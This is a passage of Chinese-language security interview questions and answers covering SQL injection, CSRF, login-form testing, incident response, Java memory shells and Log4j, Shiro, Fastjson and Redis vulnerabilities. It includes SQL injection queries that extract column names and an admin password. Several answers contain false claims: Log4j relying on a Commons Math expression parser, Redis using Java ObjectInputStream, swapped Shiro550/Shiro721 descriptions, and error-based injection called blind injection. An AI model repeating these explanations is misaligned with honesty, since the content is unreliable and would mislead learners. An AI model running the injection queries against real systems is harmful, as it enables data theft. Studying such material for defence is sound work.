参数表示扫描等级。这两个参数的区别如下： 风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。 扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。 总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。 报错注入函数报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。 您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数： SUBSTRING() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： 123PLAINTEXTSELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; LIMIT 1),1,1); LENGTH() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： 123PLAINTEXTSELECT LENGTH((SELECT username from users WHERE id=1)); ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： 123PLAINTEXTSELECT ASCII(SUBSTRING((SELECT password from users WHERE username=&#x27;admin&#x27;),1,1)); 总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。 支持报错注入的数据库都有哪些报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况： MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。 Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。 Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。 PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。 SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。 总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。 一个登录框怎么测试对于一个登录框，我们需要进行以下测试： 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 总之，在测试一个登录框时，我们需要全面考虑各种安全问题，并进行针对性的测试，以确保应用程序的安全。 csrf产生原因是什么CSRF（Cross-Site Request Forgery，跨站请求伪造）攻击是一种常见的 Web 安全漏洞，它利用用户在已登录的情况下访问恶意网站时，绕过同源策略，以用户身份执行未经授权的操作。 CSRF 攻击产生的原因主要有两个： Web 中的一些重要请求不合理地使用了 GET 方法：通常情况下，GET 方法用于获取资源，而 POST 方法用于提交数据。但是，在 Web 应用程序中，有时会把一些重要的请求用 GET 方法来实现，例如修改密码、转账等操作，这样容易被攻击者利用。 应用程序没有正确验证用户的来源：当应用程序接受到一个请求时，如果没有正确验证请求的来源是否合法，那么攻击者可以通过构造伪造的请求，以用户身份执行未经授权的操作。 总之，要防止 CSRF 攻击，开发人员需要确保应用程序中所有的关键请求都使用 POST 方法，同时，还需要对请求进行适当的验证和授权，例如添加随机 token 或验证码等机制，以确保请求的来源是合法的。 sql注入的种类SQL注入是一种常见的Web应用程序攻击，攻击者通过执行恶意的SQL查询来窃取敏感信息、修改数据或者执行其他危害行为。根据攻击者的不同攻击手段和目的，SQL注入可以分为以下几种类型： 基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。 盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以利用时间延迟等机制来判断是否成功注入恶意的SQL语句。 基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向查询结果集中添加用户列表或密码信息。 基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，该查询会返回一个布尔值，例如真或假。攻击者可以利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。 时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过向查询中添加时间延迟语句来判断查询是否成功执行。例如，攻击者可以使用 SLEEP() 函数来强制查询等待一段时间，在等待期间观察程序的响应时间来确定注入点是否存在。 总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。 api环境下sql注入如何防御在 API 环境下，防止 SQL 注入攻击的方法和 Web 应用程序类似，主要包括以下几个方面： 输入验证：开发人员需要对所有输入数据进行有效性验证，包括参数、请求体、请求头等。在验证输入时，可以使用正则表达式或白名单过滤等方法来确保输入数据的合法性。 参数化查询：在构造 SQL 查询语句时，需要使用参数化查询方式，而不是直接将输入数据拼接到 SQL 查询语句中。参数化查询可以使得 SQL 查询语句与输入数据分离，从而避免 SQL 注入漏洞的出现。 权限控制：开发人员需要对每个用户进行适当的身份认证和授权，以确保只有经过授权的用户才能访问敏感资源。在授权的过程中，还需要对用户所能访问的数据进行限制，例如使用视图或存储过程来限制用户的访问权限。 安全审计：监测应用程序的行为并记录日志，以便在发生异常情况时进行排查和调试。安全审计可以帮助开发人员及时发现潜在的漏洞和安全问题，并采取相应的措施加以修复。 定期更新：定期更新数据库软件及其组件，以确保应用程序使用的数据库软件版本是最新的，从而避免已知漏洞的利用。 总之，在 API 环境下，开发人员需要采取多种措施来保护应用程序的安全，并避免 SQL 注入攻击的出现。同时，还应该定期进行安全审计和漏洞扫描，及时发现并修复安全问题。 cs流量特征？C/S（Client/Server，客户端/服务器）流量是指基于客户端和服务器之间的通信产生的网络流量。C/S 流量特征包括以下几个方面： 会话建立：C/S 流量通常都需要进行会话建立，包括握手、协议版本交换、密钥协商等过程。在这个过程中，通常可以看到一些特定的协议字段和标志位。 数据传输：传输数据是 C/S 流量的主要特征之一。在这个过程中，通常可以看到明文或加密的数据传输，并且数据大小和传输速度也是分析流量的重要指标。 响应时间：C/S 流量通常包含请求和响应消息，因此可以通过分析请求和响应之间的时间差来判断系统性能和服务质量。 协议类型：C/S 流量涉及多种不同的协议类型，例如 HTTP、FTP、SMTP、POP3 等，每种协议的特点和流量特征也有所不同。 应用程序特点：C/S 流量还表现出应用程序的特点，例如应用程序的请求方式、请求频率、用户行为等等，这些特点对于分析和识别流量非常有帮助。 总之，在分析 C/S 流量时，需要综合考虑多个方面的特征，并结合具体的应用程序和场景进行分析。同时，也需要使用适当的工具和技术，例如协议解码器、流量捕获工具等，来对流量进行捕获和分析。 msf流量特征？MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面： 目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。 异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。 频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。 数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。 特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。 总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。 动态链接库劫持应急响应应该怎么做动态链接库劫持（也称 DLL 劫持）是一种常见的攻击手段，攻击者通过将恶意 DLL 文件替换为合法的 DLL 文件，从而实现向操作系统注入恶意代码的目的。在发现动态链接库劫持时，应该采取以下措施进行应急响应： 隔离受影响的系统：立即隔离受影响的系统，并从网络中断开，以避免进一步的攻击和传播。 恢复被劫持的 DLL 文件：找到被劫持的 DLL 文件，将其从系统中删除，并替换为原始的、正确的 DLL 文件。如果原始的 DLL 文件已经被篡改或删除，需要重新安装相应的软件或应用程序来获取正确的 DLL 文件。 检查并清除恶意代码：检查被劫持的 DLL 文件是否包含恶意代码，以及其他可能被感染的文件和系统组件。使用杀毒软件和反恶意软件等工具来清除恶意代码。 修改注册表：修改注册表，防止恶意 DLL 文件再次被加载。例如，可以修改 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 键值，将所有可信 DLL 文件添加到其中。 加强安全措施：评估系统的安全性，并加强安全措施。例如，禁用不必要的服务和进程、添加访问控制列表、加密重要数据等。 总之，在应对动态链接库劫持时，需要快速响应，并采取适当的措施进行恢复和防御，以保护系统和敏感数据的安全性。同时也需要加强监测和预防工作，对系统中的 DLL 文件进行定期检查，并实施安全审计和漏洞扫描等措施，避免类似攻击的再次出现。 几台服务器在内网，其中一台被打穿，如何排查？在一台服务器被攻破后，我们需要快速采取措施进行排查和修复，以下是一些可能的步骤： 保留现场：在发现一台服务器遭到攻击后，首先要保持现场状态不变，尽量不要修改任何文件或日志。这可以帮助我们更好地了解攻击者的行为、恶意代码的传播路径以及其他可能受到影响的系统或数据。 收集证据：收集有关攻击的证据，例如入侵检测日志、应用程序日志、网络流量捕获等。这些证据可以帮助我们确定攻击的类型、攻击的时间以及攻击者所使用的工具和技术。 切断网络连接：为了防止恶意代码继续传播，需要切断受感染服务器与外部网络的连接。这可以通过拔掉网络电缆、关闭相关端口或禁用网络适配器等方法实现。 分析恶意代码：对受感染服务器上的恶意代码进行分析，以确定其行为、传播方式和危害程度。可以使用杀毒软件、反病毒软件或专业的样本分析工具来进行分析。 验证系统完整性：验证系统文件和配置是否被恶意代码篡改，例如检查系统文件的哈希值、比较配置文件的差异等。 进行漏洞扫描：对整个内网进行漏洞扫描，以确保其他服务器没有被攻击。可以使用专业的漏洞扫描工具来进行扫描，例如 Nessus、OpenVAS 等。 加强安全措施：根据攻击者的入侵方式和攻击的原因，加强系统和网络的安全措施，例如更新补丁、升级软件、增强防火墙规则等。 总之，在排查一台服务器被攻击后，需要采取快速而有针对性的措施，并结合具体情况进行分析和修复，以保护系统和敏感数据的安全性。 java内存马有哪几种？Java内存马是指一种恶意软件，通过利用Java虚拟机的特性，在目标机器上执行恶意代码，从而控制被感染的机器。以下是几种常见的Java内存马： 基于反射的内存马：该类型的内存马通过Java反射机制动态加载字节码，绕过了Java程序的安全检查，可以在受害机器上执行任意代码。 基于Instrumentation的内存马：Instrumentation是Java提供的一组API，可以对正在运行的Java程序进行监控和修改。黑客可以利用这个机制来在目标机器上注入恶意代码。 基于ClassLoader的内存马：ClassLoader是Java中负责加载类的机制。黑客可以通过自定义ClassLoader来加载恶意代码，从而实现控制目标机器的目的。 基于JNI的内存马：JNI（Java Native Interface）是Java提供的一组API，可以在Java程序中调用本地代码。黑客可以编写本地代码，并将其作为DLL或SO文件加载到目标机器上，然后通过JNI接口与Java程序通信，从而实现控制目标机器的目的。 需要注意的是，以上仅列举了部分常见的Java内存马，黑客也可能采用其他方式来实现内存马。为了保护系统的安全，建议及时更新Java版本，并加强对Java程序的安全审计。 6379是什么端口？6379是Redis数据库的默认端口号。Redis是一种基于内存的键值存储系统，支持多种数据结构（如字符串、哈希表、列表等），并提供了丰富的操作命令（如读取、写入、删除等）。6379端口用于客户端与Redis服务器之间进行网络通信，通过这个端口，客户端可以连接到Redis服务器，并对其进行数据读写等操作。同时，6379端口也是黑客攻击Redis服务器的一个常见目标，因此在使用Redis时，需要注意设置好安全配置，保障Redis的安全性。 7001是什么端口？7001是WebLogic服务器的默认管理端口。WebLogic是一种Java应用服务器，常用于企业级应用的开发和部署，其管理控制台可以通过7001端口进行访问和管理。除了管理控制台外，7001端口还用于WebLogic服务器的内部通信，如集群间的通信、容器间的通信等。需要注意的是，由于7001端口是WebLogic服务器的默认端口，因此可能会成为攻击者的攻击目标。在使用WebLogic时，应加强对系统的安全配置，如限制管理控制台的访问权限、设置防火墙规则等，以提高系统的安全性。 设备上出现log4j，怎么判断攻击成功？如果在设备上出现了log4j，则说明攻击者可能利用Log4j漏洞进行攻击，此时可以通过以下方式判断是否真的发生了攻击： 检查服务器日志：如果攻击成功，一般会在服务器日志中留下明显的痕迹，如未经授权的文件访问、操作系统命令执行等。建议定期检查服务器日志，尤其是涉及敏感数据和关键操作的日志。 检查网络流量：攻击者在远程操纵受害设备时，一般需要与设备进行网络通信，因此可以通过检查网络流量来判断是否有异常的数据传输行为。建议采用网络监控工具对网络流量进行实时监控，并对异常流量进行警报和记录。 检查系统进程：攻击者在利用漏洞进行攻击时，可能需要启动或修改一些系统进程，因此可以通过检查系统进程列表来寻找异常行为。建议使用系统监控工具对系统进程进行实时监控，并对异常进程进行警报和记录。 需要注意的是，出现了Log4j并不意味着攻击一定已经成功，也可能只是正常业务应用中使用了Log4j功能。因此，在判断是否受到攻击时，应该综合考虑多种因素，并采取相应的安全措施。 设备出现反序列化报警，怎么判断攻击成功？当一个设备出现反序列化报警时，可能意味着攻击者已经成功地利用了该设备上的漏洞，并通过发送恶意的数据包来触发该报警。为了判断攻击是否成功，您可以进行以下几个步骤： 确认报警：首先，您需要确认该报警是否真实存在，而不是一次误报。请检查报警的详细信息，例如报警时间、报警源、报警类型等信息。 检查攻击路径：根据报警信息，您可以分析攻击者可能使用的攻击路径。例如，他们可能会尝试利用已知的漏洞或弱点来入侵系统，并在其中插入恶意代码。 搜索事件日志：搜索系统和应用程序的事件日志，以查找任何异常活动或不寻常的行为。您还可以查看系统资源的使用情况，例如CPU、内存和网络流量等，以帮助确定是否有恶意活动正在进行。 找出攻击者的IP地址：如果您能够找到攻击者的IP地址，请将其与已知的黑名单或威胁情报数据库进行比较，以确定该地址是否已被标记为恶意。 进行安全审计：最后，您可以进行安全审计以确定是否存在其他漏洞或弱点。这将帮助您修复当前的漏洞，并防止未来类似攻击的发生。 在所有这些步骤中，最重要的是快速采取行动，以尽快确定并缓解攻击影响。 fastion漏洞原理？“Fastjson” 是一种流行的 Java 序列化库，可用于将 Java 对象转换为 JSON 格式。然而，在 fastjson 序列化和反序列化的过程中，存在一些安全漏洞。其中一个漏洞就是针对 fastjson 反序列化的攻击。 fastjson 反序列化的攻击原理是通过精心构造的恶意JSON字符串，使得 fastjson 在反序列化时执行恶意代码。攻击者将恶意代码嵌入到JSON字符串中，并利用 fastjson 的某些特性来触发这些代码的执行。攻击者可能会使用这个漏洞来破坏应用程序的完整性、机密性和可用性等方面的保护措施。 具体来说，攻击者可能会在JSON字符串中添加一些特殊的快捷方式（shortcuts），例如 $ref 和 @type 等，以导致反序列化器创建新的对象实例并执行恶意代码。攻击者还可以利用fastjson中的某些漏洞，使其绕过安全检查，从而成功地执行恶意代码。 为了防止 fastjson 反序列化漏洞，开发人员需要采取一些预防措施。例如，他们应该避免直接将未经过验证的用户输入传递给 fastjson 反序列化器。开发人员还应该及时更新 fastjson 序列化库，以确保其安全性。此外，开发人员还可以使用其他序列化和反序列化库，例如Gson和Jackson等，来避免fastjson漏洞的风险。 shiro漏洞原理？Apache Shiro是一个流行的Java安全框架，用于在应用程序中实现身份验证、授权和加密等功能。然而，Apache Shiro也存在一些安全漏洞，其中最著名的是反序列化漏洞。 Shiro反序列化漏洞的根本原因是，该框架采用了Java标准库中的ObjectInputStream类来反序列化请求中的数据。攻击者可以通过构造恶意请求，并将其发送到目标系统，以触发ObjectInputStream在处理该请求时执行恶意代码的情况。 攻击者可能会利用这个漏洞来绕过Shiro的安全控制，例如成功地进行认证并获得访问受保护资源的权限。攻击者还可以通过利用这个漏洞来在目标系统上执行任意代码，进一步危害系统的机密性和完整性。 为了缓解Shiro反序列化漏洞的风险，开发人员可以采取以下预防措施： 避免直接从未经过验证的输入数据中反序列化对象。 限制反序列化器（如 ObjectInputStream）的使用，只反序列化可信来源的数据。 及时更新Shiro框架，以确保漏洞已被修复。 将Shiro部署在安全环境中，并使用网络隔离、网络监控和入侵检测等技术来加强安全控制。 log4j的漏洞原理？Log4j是Java中广泛使用的一种日志管理工具，在许多应用程序中都被广泛使用。然而，最近发现了一种名为Log4Shell的漏洞，该漏洞使攻击者可以利用Log4j来执行任意代码，从而危及系统的安全性和完整性。以下是此漏洞的原理： Log4j依赖于Apache Commons Math库中的一个子模块，即Math Expression Parser（MEP）库，以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用。 攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。 攻击者可以利用此漏洞来执行各种攻击，包括但不限于： 远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。 远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。 为了缓解Log4j漏洞的风险，建议采取以下预防措施： 更新Log4j版本：最新版本已经修复了此漏洞。 关闭JNDI：如果您不需要使用JNDI，建议禁用该功能。 阻止外部网络访问：对于架构设计合理的应用程序，应该使用网络隔离等技术来限制外部访问。这将有助于减轻远程攻击的风险。 加强应用程序安全性：开发人员应该定期审计和更新应用程序代码，以确保其安全性和完整性。 ridis漏洞原理？Redis是一个流行的开源内存数据存储系统，被广泛用于Web应用程序中的缓存、队列和消息传递等方面。然而，Redis也存在一些安全漏洞，其中最著名的是Ridic反序列化漏洞。 Ridic反序列化漏洞的根本原因是，Redis使用了Java标准库中的ObjectInputStream类来处理数据的序列化和反序列化。攻击者可以通过构造恶意请求，并将其发送到目标Redis服务器上，以触发ObjectInputStream在处理该数据时执行恶意代码的情况。 攻击者可能会利用这个漏洞来绕过Redis的身份验证、篡改或删除存储在Redis数据库中的数据，甚至在Redis服务器上执行任意代码。例如，攻击者可以使用此漏洞来： 提升权限：攻击者可以通过远程执行任意代码进一步攻击目标系统，例如窃取敏感信息、破坏系统完整性、创建后门等。 篡改数据：攻击者可以修改Redis数据库中的数据，例如覆盖现有数据、添加新的键值对等。 删除数据：攻击者可以利用此漏洞删除Redis数据库中的数据，包括重要的配置文件、认证令牌等。 为了缓解Ridic反序列化漏洞的风险，开发人员可以采取以下预防措施： 不要直接将未经过验证的用户输入数据存储在Redis数据库中。 更新Redis版本以确保漏洞已修复。 配置Redis服务器的安全设置，例如限制网络访问和使用密码进行身份验证等。 启用日志记录并监测Redis服务器上的异常活动。 将Redis服务器部署在安全环境中，并定期对其进行安全审计。 shiro550和shiro721有什么区别?Shiro550和Shiro721都是Apache Shiro框架中的安全漏洞，它们存在于不同的子模块中，并采用了不同的攻击方式。 Shiro550漏洞存在于Shiro-crypto模块中，是一种加密相关的漏洞。该漏洞使攻击者能够绕过Shiro的加密保护，从而访问受保护的资源。具体来说，攻击者可以将明文传递给加密方法，从而获得加密后的结果，然后利用这个结果来伪造受信任用户的身份。 与之相比，Shiro721漏洞则存在于Shiro-core模块中，是一种反序列化漏洞。该漏洞允许攻击者通过构造特制的序列化对象来执行任意代码，并在目标系统上实现远程代码执行攻击。攻击者可以通过向目标系统发送恶意请求触发此漏洞，并在其中嵌入恶意代码来破坏系统安全性和完整性。 总之，尽管Shiro550和Shiro721都是Shiro框架中的安全漏洞，但它们属于不同的类型和攻击方式。因此，在使用Shiro框架时，开发人员需要采取一些预防措施，并注意及时更新Shiro库中的漏洞修复。 你对反序列化漏洞了解多少？反序列化漏洞是指攻击者利用程序中未经充分验证的输入，向应用程序提供一个恶意构造的序列化对象，执行任意代码或获取敏感信息的漏洞。这种漏洞通常出现在Java和.NET等语言的应用程序中。 反序列化漏洞的本质是：当程序从存储介质读取对象时，如果没有对传入的数据进行充分验证，那么攻击者就可以通过精心构造的序列化对象，欺骗应用程序执行恶意代码。攻击者可能会在序列化对象中添加可执行代码或操作指令，以执行危害系统安全性和完整性的操作，例如修改或删除数据、窃取敏感信息或执行远程代码等。 为了防止反序列化漏洞，开发人员应该采取以下预防措施： 避免直接将未经过验证的用户输入数据反序列化为对象。 对所有用户输入进行严格的验证和过滤，包括长度、格式和内容等方面。 限制反序列化器的使用，只反序列化可信来源的数据。 及时更新反序列化库，以确保已修复已知漏洞。 在系统上禁用危险的反序列化特性，例如使用Java标准库中的ObjectInputStream类。 总之，反序列化漏洞是一种普遍存在的安全漏洞，需要开发人员特别注意，从设计、编码和测试等各个方面加强应用程序的安全性和完整性。 linux查看端口，查看进程，查看恶意文件命令是什么？ 查看端口命令： 在Linux中，可以使用以下命令来查看当前系统上打开的端口： 123PLAINTEXTnetstat -tlnp 该命令列出了当前所有的TCP和UDP监听端口，并显示哪些程序正在使用这些端口。其中，“-t”表示只显示TCP协议，“-l”表示只显示监听端口，“-n”表示不解析IP地址和端口号，“-p”表示显示进程相关信息。 查看进程命令： 在Linux中，可以使用以下命令来查看当前正在运行的进程： 123PLAINTEXTps -ef 该命令列出了当前所有的进程，并显示每个进程的PID、名称、状态、父进程ID等信息。其中，“-e”表示列出所有进程，“-f”表示完整输出格式（包括用户、CPU占用率、内存占用等）。 查看恶意文件命令： 在Linux中，可以使用以下命令来查找可能的恶意文件： 123PLAINTEXTfind / -name &lt;filename&gt; 该命令将从根目录开始搜索指定文件名的文件，并输出所有匹配的结果。注意，此命令需要root权限才能搜索整个文件系统。 此外，还可以使用以下命令来查看特定文件是否具有可疑的权限或属性： 123PLAINTEXTls -la &lt;filepath&gt; 该命令列出了特定文件的详细属性，包括所有者、组、权限、大小、修改时间和链接等信息。可以通过分析这些属性来确定文件是否具有可疑的行为。 网站被攻击了怎么排查？当网站被攻击时，开发人员应该采取以下步骤来排查： 确认是否真的被攻击了：首先需要确认是否真的被攻击了。通常情况下，被攻击的网站可能会出现许多异常行为，例如页面加载缓慢、无法访问、误导用户等。此外，也可以通过日志分析和网络监测工具来探测是否存在异常流量或恶意请求。 初步分析攻击类型：根据异常行为和日志信息，可以初步确定攻击类型，例如SQL注入、XSS跨站脚本、CSRF跨站请求伪造、DDoS攻击等。 收集证据：对于发现的异常行为和攻击类型，需要收集相关证据，并记录下时间、来源、目标等信息，以便后续分析和响应。 及时阻止攻击：在收集完足够的证据后，应该尽快采取措施来阻止攻击的继续进行。可以使用防火墙、IP过滤、封禁IP地址等技术手段来限制攻击者的访问。 分析攻击原因：在阻止攻击后，需要深入分析攻击原因。可以从系统架构、代码实现、配置管理、人员行为等方面入手，找出漏洞和弱点，并及时修复。 恢复服务：在分析和修复所有漏洞后，需要恢复服务并重新上线网站。此时，可以使用安全工具和技术来加固系统，并建立监测系统来及时发现和响应类似攻击。 总之，排查被攻击的网站是一个复杂而艰巨的过程，需要开发人员具有扎实的技能和丰富的经验。最重要的是，应该采取预防措施，在日常开发和运维中注重安全性和完整性，以防止未来的攻击。 文件上传怎么通过设备判断？在文件上传功能中通过设备判断，通常可以使用HTTP请求头中的User-Agent字段来识别用户所使用的设备类型。该字段包含了用户代理软件的名称、版本号和操作系统等信息，可以根据这些信息来判断用户所使用的设备类型，例如PC、手机或平板电脑等。 以下是一些常见的User-Agent值，用于识别不同设备类型： PC端浏览器的User-Agent值通常包含“Windows”、“Macintosh”等关键字。 iOS设备的User-Agent值通常包含“iPhone”、“iPad”等关键字。 Android设备的User-Agent值通常包含“Android”等关键字。 在服务器端代码中，可以通过解析HTTP请求头，提取User-Agent字段，并对其进行匹配和分类。例如，可以使用正则表达式来匹配User-Agent值，从而判断用户所使用的设备类型，并针对不同的设备类型做出相应的处理，例如限制上传的文件类型、大小等。 需要注意的是，User-Agent字段可能存在伪造或篡改的情况，因此不能完全依赖这个字段来确定用户的设备类型。在实现安全验证时，还需要采取其他措施，例如限制上传路径、禁止上传可执行文件、对上传文件进行文件类型检查、加强文件访问权限等，以增强上传功能的安全性和完整性。 怎么排查内存马？内存马是指恶意程序将自己注入到进程的内存中，从而实现对系统资源和数据的非法控制。由于内存马不占用磁盘空间，难以被杀毒软件检测和拦截，因此排查起来比较困难。但仍然可以采取以下一些方法来排查内存马： 进程分析：通过查看系统中所有进程的信息，包括进程名称、PID、所属用户、内存占用等，可以尝试发现异常进程并排除其中是否存在内存马。 系统日志分析：通过分析系统日志文件，可以查看系统启动、服务开启、网络连接等活动，以了解是否有可疑的行为发生。 内存分析工具：使用专业的内存分析工具，例如Volatility Framework、Mandiant Memoryze、Rekall等，可以在内存中查找潜在的内存马代码或痕迹，并进行初步分析和定位。 网络监测工具：通过网络监测工具，例如Wireshark、Tcpdump等，可以捕获网络流量，了解是否有可疑的网络请求或通信行为，进一步定位内存马的来源和命令控制中心。 安全软件扫描：利用杀毒软件和安全扫描工具，例如Norton Power Eraser、Kaspersky TDSSKiller等，可以对系统进行全面的扫描和检测，以发现并清除可能存在的内存马。 总之，排查内存马需要采取多种方法、综合分析，结合实际情况而定。在预防内存马时，还需要加强系统的安全性和完整性，限制对系统资源和文件的访问权限，禁止不必要的外部连接和通信行为，及时更新系统和应用程序的补丁和版本，从源头上避免内存马的出现。 登录框页面都可以测试哪些漏洞？登录框页面是Web应用程序中常见的功能之一，也是黑客攻击的重要目标。下面列举了一些可能存在的漏洞： SQL注入：黑客可以在登录框中输入特殊字符，从而构造恶意的SQL语句，绕过身份验证，甚至获取敏感信息。 XSS跨站脚本攻击：黑客可以通过在登录框中插入JavaScript代码，篡改页面内容或窃取用户凭据等。 CSRF跨站请求伪造：黑客可以通过构造恶意请求，在用户不知情的情况下发起伪造的登陆请求，从而模拟合法用户的身份完成相应操作。 密码弱口令：用户设置的密码太简单或者容易被猜到，导致黑客可以轻松破解，进而访问网站的系统资源和数据。 会话固定攻击：黑客可以通过截获会话ID，让其他用户使用这个会话ID来登录，从而获取用户的敏感信息。 身份验证绕过：黑客可以通过各种手段，如暴力破解、抓包分析等方式，绕过身份验证机制，进而访问系统资源和数据。 命令注入：黑客可以在用户名或密码中注入恶意的命令，从而执行系统命令，控制服务器。 为了有效地防范这些漏洞，开发人员应该采取一些预防措施，例如加强用户输入的验证和过滤、使用安全的密码策略、使用CSRF Token、启用HTTPS等。此外，还应该定期对登录页面进行渗透测试和安全评估，及时发现并修复潜在的漏洞。 sql盲注有几种方法？SQL盲注是指通过构造特定的SQL语句，利用Web应用程序的漏洞来获取敏感信息或执行具有破坏性的操作。根据不同的条件和情况，SQL盲注可以分为以下几种方法： 基于布尔盲注：基于布尔盲注的攻击方式是常见的SQL盲注手段之一。黑客通过构造恶意的SQL语句，向Web应用程序提交查询请求，并观察返回结果中的布尔值（True或False）来推断查询语句中的条件是否成立。在这种攻击方式中，黑客通常会构造使用”AND”或者”OR”关键字的语句，以及适当的参数组合，从而判断出数据库中的数据是否符合预期要求。 基于时间盲注：基于时间盲注也是SQL盲注的一种类型。在这种攻击方式中，黑客通过构造恶意的SQL语句，在查询时增加等待时间，以便观测程序在执行恶意查询后的响应时间。如果响应时间与正常情况下相比明显延长，则说明恶意查询已经被执行。 基于错误消息盲注：基于错误消息盲注是另一种常见的SQL盲注攻击方式。黑客通过构造恶意的SQL语句，向Web应用程序提交查询请求，如果数据不符合预期要求，则会触发数据库的错误消息。黑客可以通过观察错误消息中的详细信息，推断出恶意查询是否执行成功。 基于联合查询盲注：基于联合查询盲注是另一种SQL盲注攻击方式。在这种攻击方式中，黑客通过构造特定的SQL语句，并使用”UNION”关键字来实现查询结果的合并。黑客可以通过修改查询语句中的参数，或者增加或减少查询中的表格数目，来获取敏感信息或执行破坏性操作。 